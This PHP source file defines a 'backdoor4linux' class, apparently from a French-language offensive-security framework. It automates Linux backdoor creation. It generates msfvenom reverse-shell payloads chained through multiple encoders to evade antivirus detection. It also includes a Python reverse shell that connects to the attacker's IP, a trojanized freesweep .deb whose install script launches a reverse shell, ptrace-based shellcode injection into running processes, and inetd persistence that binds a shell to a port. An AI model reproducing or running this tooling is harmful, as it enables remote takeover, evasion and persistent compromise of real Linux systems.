<?php 




class backdoor4linux extends malware4linux{

  

    public function __construct($target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output) {
        parent::__construct($target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output);
    }

    
    function backdoor_linux_c4rev8msf_x86() {
        $this->ssTitre(__FUNCTION__);
       return  $this->req_ret_str("msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --encoder x86/shikata_ga_nai --iterations 1 --format c  ");
    }
    
    function backdoor_linux_elf4rev8msf_x86() {
        $this->ssTitre(__FUNCTION__);
        return  $this->req_ret_str("msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --encoder x86/shikata_ga_nai --iterations 1 --format elf  ");
    }
    
    function backdoor_linux_msf2c2rev() {
        $this->ssTitre("SHELLCODE C");
        

        $this->requette("msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --encoder x86/shikata_ga_nai --iterations 1 --format c > $this->file_dir/$this->file_name.h ");
        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_dir/$this->file_name.h");
        $this->requette("cat $this->file_dir/$this->file_name.h");
       
        
        $check = file_get_contents("$this->file_dir/$this->file_name.h");
        if (empty($check )) {
            $this->important("Echec msfvenom C Retry in 3 secondes");
            sleep(3 );
            return $this->backdoor_linux_msf2c2rev();
        }
        
        $file_c = new FILE("$this->file_dir/$this->file_name.h");
        $file_elf = $file_c->file_c2elf("-m32");
        $this->file_file2virus2vt();
        $this->elf2info();$this->pause();
        
        $cmd1 = "nc -l -p $this->attacker_port -v -n";
        $cmd2 = "$this->file_path ";
        $this->exec_parallel($cmd1, $cmd2, 1);
        $this->pause();
    }
    
    
    public function backdoor_linux_c2passwd(){
        $this->ssTitre(__FUNCTION__);
        $this->requette("cp -v $this->dir_c/backdoor_with_password.c $this->file_dir/$this->file_name.c");
        $file_c = new FILE("$this->file_dir/$this->file_name.c");
        $file_elf = $file_c->file_c2elf("-m32");
        $this->file_file2virus2vt();
        $this->elf2info();
        $this->pause();
        $cmd1 = "$this->file_path /bin/sh $this->attacker_port rohff ";
        $cmd2 = "nc $this->attacker_ip $this->attacker_port -v -n";
        $this->exec_parallel($cmd1, $cmd2, 2);
        $this->pause();
    }

    
    
    
    public function backdoor_linux_perl4rev8msf() {
        $this->ssTitre(__FUNCTION__);
        $query = "msfvenom -p cmd/unix/reverse_perl LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform unix --encoder  x86/shikata_ga_nai  --iterations 10 --format raw ";
        return $this->req_ret_str($query);
    }
    
    public function backdoor_linux_bash4rev8msf() {
        $this->ssTitre(__FUNCTION__);
        $this->rouge("This will not work on most Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.");
        $query = "msfvenom -p cmd/unix/reverse_bash LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform unix --encoder  x86/shikata_ga_nai  --iterations 10 --format bash ";
        return $this->req_ret_str($query);
    }
    
    public function backdoor_linux_python4rev8simple($shell) {
        $this->ssTitre(__FUNCTION__);

        $code =<<<CODE
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("$this->attacker_ip",$this->attacker_port));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["$shell","-i"]);
CODE;
        
        return $code ;
    }
    
    public function backdoor_linux_python4rev8msf() {
        $this->ssTitre(__FUNCTION__);
        $query = "msfvenom -p cmd/unix/reverse_python LHOST=$this->attacker_ip LPORT=$this->attacker_port --format raw ";        
        return $this->req_ret_str($query);
    }
    
    public function backdoor_linux_elf4rev8msf_encoded_10() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload  linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --arch x86 --encoder  x86/shikata_ga_nai  --iterations 10 --format elf ";
        return $this->req_ret_str($query);
    }
    
    
    
    public function backdoor_linux_elf4rev8msf_encoded_multi() {
        $this->ssTitre(__FUNCTION__);
        $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/alpha_mixed BufferRegister=EAX  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format elf ";
        //$query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format elf -o $this->file_path";
        //$query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 40 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 10  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 40  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 10  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 40  --platform linux --format elf -o $this->file_path";
        return $this->req_ret_str($query);
    }
    
    
    public function backdoor_linux_elf4rev8msf_simple() {
        $this->ssTitre(__FUNCTION__);
        $this->ssTitre("Creation de backdoor TCP avec MSF MODE Reverse pour cible Linux" );
        $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
        $query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --arch x86 --encoder  x86/shikata_ga_nai  --iterations 1 --format elf ";
        return $this->req_ret_str($query);
    }
    
    
    public function backdoor_linux_fake_deb() {
        $this->ssTitre(__FUNCTION__);
        $this->ssTitre(".deb file" );
        $this->requette("echo '$this->root_passwd' | sudo -S apt-get download freesweep" );
        $this->requette("echo '$this->root_passwd' | sudo -S mv -v ./freesweep_0.90-2_amd64.deb $this->file_dir/" );
        $this->requette("dpkg -x $this->file_dir/freesweep_0.90-2_amd64.deb $this->file_dir/work" );
        $this->requette("mkdir $this->file_dir/work/DEBIAN" );
        $control = 'Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
Freesweep: is an implementation of the popular minesweeper game, where one tries to find all the mines without igniting any, based on hints given by the computer. Unlike most implementations of this game, Freesweep works in any visual text display - in Linux console, in an xterm, and in most text-based terminals currently in use.';
        $this->requette("echo '$control' | tee $this->file_dir/work/DEBIAN/control " );
        $postinst = '#!/bin/sh
sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &';
        $this->requette("echo '$postinst' | tee $this->file_dir/work/DEBIAN/postinst " );
        $this->requette("chmod 755 $this->file_dir/work/DEBIAN/postinst" );
        $this->requette("msfvenom --payload  linux/x86/shell/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port X > $this->file_dir/work/usr/games/freesweep_scores" );
        $this->requette("dpkg-deb --build $this->file_dir/work/" );
        $this->requette("mv -v $this->file_dir/work.deb $this->file_dir/freesweep.deb" );
        $cmd1 = "nc -l -p $this->attacker_port -v -n";
        $cmd2 = "echo '$this->root_passwd' | sudo -S dpkg -i $this->file_dir/freesweep.deb";
        $this->exec_parallel($cmd1, $cmd2, 0 );
        $this->pause();
    }
    
    
    
    
    
    
    
    
    
    
    public function rooted_linux_injected_into_pid() {
        $this->gtitre("Inject Shellcode into an existing process on Linux" );
        //$this->img("$this->dir_img/bof/memore_vive_processus.png");
        //intro::backdoor_linux_ptrace_intro();
        
        
        $this->titre("Shellcode execve + argv(cmd) = Exec Command into an existing process  " );
        $this->article("DO", "Prog ton inject in -> Show Process PID and PPID" );
        $this->requette("gcc $this->dir_c/ptrace_prog_target.c -ggdb -o $this->file_dir/ptrace_prog_target.elf -m32" );
        $prog_target = "$this->file_dir/ptrace_prog_target.elf";
        $this->requette("cp -v $this->dir_c/meminj.c $this->dir_tmp/meminj.c ");
        $file_elf = new file("$this->dir_tmp/meminj.c");
        $prog_inject = $file_elf->file_c2elf("-m32");
        
        
        $this->titre("Inject via argv /bin/sh" );
        
        $cmd1 = "$prog_target";
        $cmd2 = "echo '$this->root_passwd' | sudo -S $prog_inject -p `pidof $prog_target` -c /bin/sh ";
        $this->cmd("localhost","$cmd1");
        $this->cmd("localhost","$cmd2");
        /*
        $cmd3 = "cd $this->file_dir; gcore  `pidof $prog_target`";
        $cmd4 = "echo '$this->root_passwd' | sudo -S insmod /opt/LiME/src/lime-`uname -r`.ko \"path=$prog_target.lime format=lime\" ";
        $cmd5 = "hexdump -C $this->file_dir/core.7734 | grep 'ELF' -A4 ";

        $this->cmd("localhost","$cmd3");
        $this->cmd("localhost","$cmd4");
        $this->cmd("localhost","$cmd5");
        $this->pause();
        $this->requette($cmd5);
        
        //
        //$this->install_for_vol_profile_localhost();$this->pause();
        
        $analyse_file = new for4linux("$prog_target.lime", "LinuxUbuntu16044x64");
        $analyse_file->for4linux_Malware_malfind("");
        $this->pause();
        */
        
        $this->titre("Inject Shellcode" );
        if (! file_exists("/opt/code-injector/bind_sh_32.s" )) $this->install_malware_code_injector();
        $this->requette("gedit /opt/code-injector/bind_sh_32.s 2&> /dev/null" );
        $this->requette("as --32 /opt/code-injector/bind_sh_32.s -o $this->file_dir/bind_sh_32.o" );
        $this->requette("objcopy -O binary $this->file_dir/bind_sh_32.o $this->file_dir/bind_sh_32.bin" );
        $this->pause();
        
        $this->cmd("localhost", $prog_target );
        $this->pause();
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S /opt/code-injector/injector `pidof $prog_target` < $this->file_dir/bind_sh_32.bin" );
        $this->article("DO", "une fois les commandes ci dessus lancer, on lance le reste" );
        $this->cmd("localhost", "nc localhost 4444 -v" );
        
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S netstat -tupan | grep '4444' " );
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S ps aux | grep '$prog_target' " );
        // dumper la memoire du processus
        $this->pause();
        /*
         *
         * if (!file_exists("/opt/parasite/trunk/bin/parasite")) requette("cd /opt/; sudo svn checkout https://github.com/jtripper/parasite ; sudo chown -R $this->user2local :$this->user2local /opt/parasite;cd /opt/parasite; make");
         * pause();
         *
         * titre("On 64 Bits");
         * question("dans quel processus peut-on injecter notre code"); // firefox / anti-virus
         * ssTitre("Looking for other interesting Process exec");
         * requette("ps aux");
         * $tmp = req_ret("pidof /usr/lib/firefox/firefox");
         * $firefox_pid = $tmp[0];unset($tmp);
         * requette("msfvenom --payload  linux/x86/shell_reverse_tcp LPORT=6666 LHOST=$lts R | tee $this->file_dir/reverse_sh_64.raw ");
         * cmd($lts,"nc -l 6666 -v");pause();
         * cmd("localhost","echo '$this->root_passwd' | sudo -S /opt/code-injector/injector $firefox_pid < $this->file_dir/reverse_sh_64.raw");pause();
         * requette("ps aux | grep '$prog_target' | head -1 ");
         * requette("echo '$this->root_passwd' | sudo -S netstat -tupan | grep '5544' ");
         * pause();
         */
    }
    
    
    
    
    
    
    public function rooted_linux_persistance() {
        $this->ssTitre(__FUNCTION__);
        /*
         * at : programme une tache à exécuter à une heure ultérieure ex : at 18:22 ou at now + 5hours puis ctlr D
         * atq : lister les jobs en attente
         * atrm : supr jobs
         */
        $this->article("Test","Pick an obscure service from /etc/services associated with a tcp port 1024 and above…for example laplink");
        $this->requette("echo \"laplink $this->attacker_port/tcp # laplink\nlaplink stream tcp nowait /bin/sh bash -i\nrestart inetd.conf\nkillall -HUP inetd\" > $this->file_path");
        $victime = new vm($this->target_vmx_name);
        //$victime->vm2upload($this->file_path, "$this->vm_tmp_lin/$this->file_ext");
        $this->cmd($this->target_ip,"bash $this->vm_tmp_lin/$this->file_ext");
        //$this->
    }
    
    
    
}
?>